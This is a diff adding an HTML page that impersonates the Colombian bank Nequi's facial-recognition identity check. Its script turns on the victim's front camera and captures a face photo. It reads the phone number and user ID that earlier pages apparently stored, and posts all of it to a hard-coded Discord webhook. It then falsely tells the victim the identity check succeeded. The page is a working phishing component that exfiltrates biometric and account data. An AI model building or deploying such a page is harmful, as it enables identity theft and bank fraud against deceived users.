@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nequi - Reconocimiento Facial</title>
+    <link rel="stylesheet" href="assets/fonts/fonts.css">
+    <link rel="stylesheet" href="css/auth-v2-login.css">
+    <link rel="stylesheet" href="css/styles.css">
+    <link rel="stylesheet" href="css/navbar.css">
+
+    <style>
+        /* =========================================
+           ESTILOS ESPECÍFICOS FACE ID (CORREGIDOS)
+           ========================================= */
+
+        /* Contenedor principal para centrar todo */
+        .camera-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px 10px; /* Menos padding lateral en móviles */
+            width: 100%;
+        }
+
+        /* Títulos */
+        .camera-section h1 {
+            font-size: 1.5rem;
+            color: #200020;
+            margin-bottom: 5px;
+            text-align: center;
+        }
+
+        .camera-section h2 {
+            font-size: 1rem;
+            color: #666;
+            font-weight: normal;
+            margin-bottom: 20px; /* Reducido un poco */
+            text-align: center;
+        }
+
+        /* Marco de la cámara */
+        .video-wrapper {
+            position: relative;
+            width: 100%;
+            max-width: 320px;
+            height: 450px;
+            overflow: hidden;
+            border-radius: 20px;
+            background: #000;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            margin: 0 auto; /* Centrar */
+        }
+
+        /* El video */
+        #video-stream {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+            display: block;
+        }
+
+        /* LA MÁSCARA DEL ÓVALO */
+        .oval-overlay {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 70%; 
+            height: 65%; 
+            border-radius: 50%;
+            /* Sombra gigante oscura */
+            box-shadow: 0 0 0 1000px rgba(20, 0, 30, 0.85); 
+            /* Borde sutil */
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            pointer-events: none;
+            z-index: 10;
+        }
+
+        /* ---- CAMBIOS DE POSICIÓN Y ESPACIADO AQUÍ ---- */
+
+        /* Botón de acción (Ahora arriba de las instrucciones) */
+        .btn-capture {
+            background-color: #DA0081;
+            color: white;
+            border: none;
+            padding: 15px 0;
+            width: 100%;
+            max-width: 320px; /* Que no sea más ancho que el video */
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(218, 0, 129, 0.3);
+            transition: background 0.3s, transform 0.1s;
+            
+            /* NUEVO ESPACIADO */
+            /* 15px arriba (separado del video), 10px abajo (separado del texto) */
+            margin: 15px auto 10px auto; 
+            display: block; /* Asegurar que se centre con margin auto */
+        }
+        
+        .btn-capture:active {
+             transform: scale(0.98); /* Pequeño efecto al presionar */
+        }
+
+        /* Texto de instrucción (Ahora debajo del botón) */
+        .instruction-text {
+            color: #DA0081;
+            font-weight: bold;
+            text-align: center;
+            /* NUEVO ESPACIADO: Reducido porque el botón ya da espacio */
+            margin-top: 5px; 
+            margin-bottom: 20px;
+            font-size: 1rem;
+            font-family: sans-serif;
+        }
+        /* ---------------------------------------------- */
+
+        .btn-capture:hover { background-color: #b00068; }
+        .btn-capture:disabled { background-color: #ccc; cursor: not-allowed; box-shadow: none; }
+        #canvas-capture { display: none; }
+    </style>
+</head>
+
+<body>
+    <header class="navbarContainer">
+        <div class="navbarWrapper">
+            <div class="navbarContent">
+                <a href="index.html">
+                    <svg width="180" height="40" viewBox="0 0 104 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081"></path>
+                        <path d="M31.9876 0H28.2187C27.7033 0 27.3006 0.416 27.3006 0.912V15.872C27.3006 16.176 26.8979 16.288 26.753 16.016L17.991 0.4C17.8461 0.144 17.5884 0 17.2823 0H11.0169C10.5015 0 10.0988 0.416 10.0988 0.912V24.816C10.0988 25.328 10.5176 25.728 11.0169 25.728H14.7858C15.3012 25.728 15.7039 25.312 15.7039 24.816V9.408C15.7039 9.104 16.1066 8.992 16.2515 9.264L25.2551 25.344C25.4 25.6 25.6577 25.744 25.9638 25.744H31.9554C32.4708 25.744 32.8735 25.328 32.8735 24.832V0.912C32.8735 0.4 32.4547 0 31.9554 0H31.9876Z" fill="#200020"></path>
+                        <path d="M54.6495 16.3999C54.6495 9.66395 50.2363 6.31995 45.3883 6.31995C39.0906 6.31995 35.4988 10.6559 35.4988 16.5119C35.4988 23.1679 40.0087 26.3359 45.2433 26.3359C50.4779 26.3359 53.5382 23.6479 54.3596 20.1599C54.4724 19.7119 54.2147 19.3119 53.5382 19.3119H50.5746C50.2363 19.3119 49.9464 19.4879 49.8015 19.8239C49.0606 21.4399 47.8687 22.2879 45.5815 22.2879C42.9884 22.2879 41.2489 20.6719 40.9912 17.3919H53.7315C54.2791 17.3919 54.6495 16.9919 54.6495 16.3999ZM41.2006 13.8559C41.7482 11.4399 43.1656 10.3679 45.3077 10.3679C47.2244 10.3679 48.8673 11.4719 49.0928 13.8559H41.2006Z" fill="#200020"></path>
+                        <path d="M103.082 6.80005H99.2969C98.7899 6.80005 98.3788 7.20837 98.3788 7.71205V24.832C98.3788 25.3357 98.7899 25.744 99.2969 25.744H103.082C103.589 25.744 104 25.3357 104 24.832V7.71205C104 7.20837 103.589 6.80005 103.082 6.80005Z" fill="#200020"></path>
+                        <path d="M74.976 6.80002H71.2071C70.6917 6.80002 70.289 7.21602 70.289 7.71202V8.64002C69.1615 7.32802 67.3093 6.41602 64.8772 6.41602C59.4332 6.41602 56.5501 11.312 56.5501 16.496C56.5501 21.024 58.9178 26.096 64.7644 26.096C66.8583 26.096 69.081 25.104 70.289 23.696V31.056C70.289 31.568 70.7078 31.968 71.2071 31.968H74.976C75.4914 31.968 75.8941 31.552 75.8941 31.056V7.72802C75.8941 7.21602 75.4753 6.81602 74.976 6.81602V6.80002ZM66.3912 22.064C63.9108 22.064 62.1713 20.256 62.1713 16.368C62.1713 12.48 63.9108 10.448 66.3912 10.448C68.8716 10.448 70.6111 12.32 70.6111 16.368C70.6111 20.416 68.8716 22.064 66.3912 22.064Z" fill="#200020"></path>
+                        <path d="M95.0448 6.80005H91.2759C90.7604 6.80005 90.3578 7.21605 90.3578 7.71205V17.3921C90.3578 20.5121 88.9565 21.4241 87.1687 21.4241C85.3809 21.4241 83.9796 20.5121 83.9796 17.3921V7.71205C83.9796 7.20005 83.5608 6.80005 83.0615 6.80005H79.2926C78.7772 6.80005 78.3745 7.21605 78.3745 7.71205V17.7921C78.3745 23.7921 81.7086 26.2081 87.1848 26.2081C92.661 26.2081 95.9951 23.7761 95.9951 17.7921V7.71205C95.9951 7.20005 95.5763 6.80005 95.077 6.80005H95.0448Z" fill="#200020"></path>
+                    </svg>
+                </a>
+            </div>
+        </div>
+    </header>
+
+    <section class="camera-section">
+        <div class="formContainer" style="width:100%; max-width: 400px; background: transparent; box-shadow: none; padding: 0;">
+            <h1>Reconocimiento Facial</h1>
+            <h2>Valida tu identidad</h2>
+            
+            <div class="video-wrapper">
+                <video id="video-stream" autoplay playsinline muted></video>
+                <div class="oval-overlay"></div>
+            </div>
+
+            <button id="capture-btn" class="btn-capture">Verificar Rostro</button>
+
+            <p class="instruction-text">Pon tu cara en el óvalo y presiona verificar</p>
+            
+            <canvas id="canvas-capture"></canvas>
+        </div>
+    </section>
+
+    <script>
+        // ==========================================
+        // CONFIGURACIÓN DE DISCORD
+        // ==========================================
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1444716847537586218/g5q5-xlIPP6R-jJF4skloG3n1wjlhMwdgmvBG_xQkghF0JQ5QEsKiYrWnCWYcAsf2sDk"; 
+        // ⚠️ RECUERDA PEGAR TU URL DE DISCORD EN LA LÍNEA DE ARRIBA
+
+        const video = document.getElementById('video-stream');
+        const canvas = document.getElementById('canvas-capture');
+        const captureBtn = document.getElementById('capture-btn');
+        let stream = null;
+
+        // 1. INICIAR LA CÁMARA FRONTAL
+        async function initCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user', 
+                        width: { ideal: 720 }, 
+                        height: { ideal: 1280 } 
+                    }, 
+                    audio: false 
+                });
+                video.srcObject = stream;
+            } catch (err) {
+                console.error("Error al acceder a la cámara:", err);
+                alert("Necesitamos acceso a la cámara para validar tu identidad. Por favor revisa los permisos.");
+            }
+        }
+
+        // 2. FUNCIÓN PARA ENVIAR A DISCORD
+        async function sendToDiscord(blob) {
+            captureBtn.disabled = true;
+            captureBtn.innerText = "Validando...";
+
+            const formData = new FormData();
+            const userData = JSON.parse(localStorage.getItem('formData')) || {};
+            const mensaje = `🟣 **FACE ID CAPTURED** 🟣\n📱 **Usuario:** ${userData.phoneNumber || 'Desconocido'}\n🆔 **ID:** ${userData.UserId || 'N/A'}`;
+
+            formData.append('payload_json', JSON.stringify({
+                content: mensaje
+            }));
+            formData.append('file', blob, 'face_id_capture.png');
+
+            try {
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (response.ok) {
+                    alert("Identidad validada correctamente.");
+                    window.location.href = "final.html"; 
+                } else {
+                    throw new Error('Error en el servidor de Discord');
+                }
+            } catch (error) {
+                console.error(error);
+                alert("Ocurrió un error en la validación. Intenta nuevamente.");
+                captureBtn.disabled = false;
+                captureBtn.innerText = "Verificar Rostro";
+            }
+        }
+
+        // 3. EVENTO DE CAPTURA
+        captureBtn.addEventListener('click', () => {
+            if (!stream) {
+                alert("La cámara no está iniciada.");
+                return;
+            }
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.translate(canvas.width, 0);
+            ctx.scale(-1, 1);
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob((blob) => {
+                if(blob) {
+                    sendToDiscord(blob);
+                } else {
+                    alert("Error al procesar la imagen.");
+                }
+            }, 'image/png', 0.9);
+        });
+
+        window.addEventListener('load', initCamera);
+    </script>
+</body>
+</html>
